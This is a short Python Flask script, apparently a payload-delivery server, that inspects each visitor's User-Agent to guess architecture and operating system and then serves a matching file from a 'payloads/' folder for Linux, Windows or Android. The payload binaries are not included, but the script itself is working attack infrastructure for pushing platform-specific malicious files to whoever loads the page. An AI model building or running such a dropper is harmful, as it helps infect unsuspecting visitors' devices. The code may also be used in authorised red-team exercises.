from flask import Flask 
from flask import request
from flask import send_file

#declare flask object and route index page
app = Flask(__name__)
@app.route('/')
def index():

    #get the user agent of the client
    user_agent = request.headers.get('User-Agent')

    #variables for architecture test     
    x64_test = "x86_64"
    architectures = ["x64","x86"]
    architecture = ""

    #architecture test against user agent
    if x64_test in user_agent:
        architecture = architectures[0]
    else:
        architecture = architectures[1]

    #variables for operating systems test
    android_test = "Android"
    linux_test = "Linux"
    window_test = "Windows"
    operating_systems = ["android","linux","windows"]
    operating_system = ""

    #operating system test against user agent
    if linux_test in user_agent:
        operating_system = operating_systems[1]
        if android_test in user_agent:
            operating_system = operating_systems[0]
    else:
        operating_system = operating_systems[2]

    #concatenated pattern for switch
    arch_os_pattern = architecture + " " + operating_system

    #variable for filepath to payload
    filepath = ""

    #set filepath with 
    if arch_os_pattern == "x64 linux":
        filepath = "payloads/linux_x64"
    
    if arch_os_pattern == "x64 windows":
        filepath = "payloads/windows_x64"
    
    if arch_os_pattern == "x64 android":
        filepath = "payloads/android_x64"
    
    if arch_os_pattern == "x86 linux":
        filepath = "payloads/linux_x86"
    
    if arch_os_pattern == "x86 windows":
        filepath = "payloads/windows_x86"
    
    if arch_os_pattern == "x86 android":
        filepath = "payloads/android_x86"
    
    #send set payload
    if filepath == "":
        return "Error"
    else:
        return send_file(filepath)